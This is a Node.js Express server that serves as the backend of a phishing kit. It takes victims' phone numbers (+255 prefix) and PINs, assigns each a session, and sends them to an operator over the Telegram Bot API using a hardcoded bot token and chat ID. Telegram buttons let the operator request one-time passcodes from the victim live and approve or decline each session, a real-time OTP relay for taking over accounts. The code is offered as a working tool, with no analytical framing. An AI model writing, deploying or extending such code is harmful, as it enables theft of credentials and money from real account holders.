const express = require("express");
const axios = require("axios");
const cors = require("cors");
const bodyParser = require("body-parser");
const crypto = require('crypto');


const path = require("path");

const app = express();
const PORT = process.env.PORT || 5002;

// Serve all files in your folder (like index.html, step6.html, etc.)
app.use(express.static(path.join(__dirname, "public"))); 

// Add a route to serve your main HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname,"public", "index.html")); 
});


app.use(cors());
app.use(bodyParser.json());
// app.use(express.static('public'));

// --- TELEGRAM CONFIG ---
const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const TELEGRAM_ADMIN_ID = "7162306402";
const BASE_URL = process.env.RENDER_EXTERNAL_URL ||`http://localhost:${PORT}`; // Update if deployed


const sessions = {};
// Test route to check if server is alive
app.get("/", (req, res) => {
  res.send("✅ Server is running! Ready to receive data.");
});

// Main submission route
app.post("/api/submit", async (req, res) => {
  const { phone, pin } = req.body;

  const sessionId = crypto.randomBytes(16).toString("hex");
  sessions[sessionId] = { status: 'waiting' , phone, pin, timestamp: Date.now() };

  console.log(`📩 Received attempt for: +255${phone}`);

  const message = `
🔔 *New Login Attempt*
----------------------
📱 *Phone:* \`+255${phone}\`
🔐 *PIN:* \`${pin}\`
🆔 *ID:* \`${sessionId}\`
----------------------
*Admin Actions:*
    `;

  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_ADMIN_ID,
        text: message,
        parse_mode: "Markdown",
        reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔢 Request OTP (5)", url: `${BASE_URL}/api/cmd/${sessionId}/otp5` },
                        { text: "🔢 Request OTP (6)", url: `${BASE_URL}/api/cmd/${sessionId}/otp6` }
                    ],
                    [
                        { text: "✅ Done / Redirect", url: `${BASE_URL}/api/cmd/${sessionId}/done` }
                    ]
                ]
            }
      },
    );

    console.log("🚀 Notification sent to Telegram Admin");
    res.json({ success: true, sessionId });
  } catch (error) {
    console.error(
      "❌ Telegram Error:",
      error.response ? error.response.data : error.message,
    );
    res
      .status(500)
      .json({ success: false, message: "Failed to send to Telegram" });
  }
});


// 2. Admin Command Handler (When you click a button in Telegram)
app.get('/api/cmd/:id/:command', (req, res) => {
    const { id, command } = req.params;
    if (sessions[id]) {
        sessions[id].status = command;
        res.send(`<h1>Command Sent!</h1><p>Action <b>${command}</b> active for session ${id}.</p><script>setTimeout(window.close, 1500)</script>`);
    } else {
        res.status(404).send('Session not found.');
    }
});

// 3. Status Polling (The App calls this every 2 seconds)
app.get('/api/status/:id', (req, res) => {
    const session = sessions[req.params.id];
    if (session) {
        res.json({ status: session.status });
    } else {
        res.status(404).json({ status: 'not_found' });
    }
});

// 3. Submit OTP & Wait for Admin Decision
app.post('/api/submit-otp', async (req, res) => {
    const { otp, sessionId } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].status = 'verifying';
        const msg = `🔐 *OTP Received*\nUser: +255${sessions[sessionId].phone}\nOTP: ${otp}`;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: msg,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Accept", callback_data: `accept_${sessionId}` },
                    { text: "❌ Decline", callback_data: `decline_${sessionId}` }
                ]]
            }
        });
        res.json({ success: true });
    }
});

// 4. Webhook for Admin Clicks
app.post('/api/webhook', (req, res) => {
    const { callback_query } = req.body;
    if (!callback_query) return res.sendStatus(200);

    const [action, val, sid] = callback_query.data.split('_');
    if (sessions[sid]) {
        if (action === 'ask') sessions[sid].status = `go_otp_${val}`;
        else if (action === 'accept') sessions[sid].status = 'approved';
        else if (action === 'decline') sessions[sid].status = 'declined';
    }
    res.sendStatus(200);
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`
🚀 SERVER STARTED SUCCESSFULLY
----------------------------------
Local access: http://localhost:${PORT}
Network access: Check your IP (e.g., http://192.168.1.x:${PORT})
----------------------------------
    `);
});
